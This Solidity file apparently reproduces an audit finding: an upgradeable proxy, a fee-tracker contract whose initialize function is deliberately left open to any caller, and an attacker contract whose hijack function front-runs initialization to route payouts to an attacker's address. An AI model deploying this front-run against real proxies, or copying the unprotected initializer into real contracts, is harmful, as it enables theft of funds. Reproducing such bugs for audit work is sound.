// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IBalanceTrackerLike {
    function initialize(address payable[] memory systemAddresses_, uint256[] memory targetBalances_) external;
    function processFees() external;
    function systemAddresses(uint256 index) external view returns (address payable);
    function systemAddressesLength() external view returns (uint256);
}

/// @notice Minimal proxy with unstructured storage to avoid implementation slot collisions.
contract BaseF1SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("base.f1.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("base.f1.proxy.admin")) - 1);

    error Unauthorized();
    error ImplementationNotSet();

    constructor(address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            sstore(adminSlot, admin_)
        }
    }

    function admin() public view returns (address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            admin_ := sload(adminSlot)
        }
    }

    function implementation() public view returns (address implementation_) {
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            implementation_ := sload(implementationSlot)
        }
    }

    function upgradeTo(address implementation_) external {
        if (msg.sender != admin()) revert Unauthorized();
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(implementationSlot, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {}

    function _delegate() internal {
        address impl = implementation();
        if (impl == address(0)) revert ImplementationNotSet();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice BalanceTracker model preserving the relevant bug parity:
///         `initialize(...)` is externally callable with no caller authorization.
contract BaseF1BalanceTrackerLike {
    uint8 private _initializedVersion;

    address payable public immutable PROFIT_WALLET;
    address payable[] public systemAddresses;
    uint256[] public targetBalances;

    error InvalidAddress();
    error InvalidLength();
    error AlreadyInitialized();

    constructor(address payable profitWallet_) {
        if (profitWallet_ == address(0)) revert InvalidAddress();
        PROFIT_WALLET = profitWallet_;

        // Bug parity with OZ _disableInitializers() on implementation deployment.
        _initializedVersion = type(uint8).max;
    }

    receive() external payable {}

    function initialize(address payable[] memory systemAddresses_, uint256[] memory targetBalances_) external {
        // Bug parity with reinitializer(2) behavior in proxy context (slot is 0 before first call).
        if (_initializedVersion >= 2) revert AlreadyInitialized();
        if (systemAddresses_.length == 0) revert InvalidLength();
        if (systemAddresses_.length != targetBalances_.length) revert InvalidLength();

        for (uint256 i = 0; i < systemAddresses_.length; i++) {
            if (systemAddresses_[i] == address(0) || targetBalances_[i] == 0) revert InvalidAddress();
        }

        _initializedVersion = 2;
        systemAddresses = systemAddresses_;
        targetBalances = targetBalances_;
    }

    function initializedVersion() external view returns (uint8) {
        return _initializedVersion;
    }

    function systemAddressesLength() external view returns (uint256) {
        return systemAddresses.length;
    }

    function processFees() external {
        uint256 len = systemAddresses.length;
        if (len == 0) revert InvalidLength();

        for (uint256 i = 0; i < len; i++) {
            uint256 addressBalance = systemAddresses[i].balance;
            uint256 target = targetBalances[i];
            if (addressBalance >= target) {
                continue;
            }
            uint256 needed = target - addressBalance;
            uint256 payout = needed > address(this).balance ? address(this).balance : needed;
            (bool success,) = systemAddresses[i].call{value: payout}("");
            success;
        }

        (bool ok,) = PROFIT_WALLET.call{value: address(this).balance}("");
        ok;
    }
}

/// @notice Helper that performs the attacker front-run initialize call.
contract BaseF1InitializerAttacker {
    function hijack(address proxy, address payable attackerRecipient, uint256 target) external {
        address payable[] memory systemAddresses_ = new address payable[](1);
        systemAddresses_[0] = attackerRecipient;
        uint256[] memory targetBalances_ = new uint256[](1);
        targetBalances_[0] = target;
        IBalanceTrackerLike(proxy).initialize(systemAddresses_, targetBalances_);
    }
}
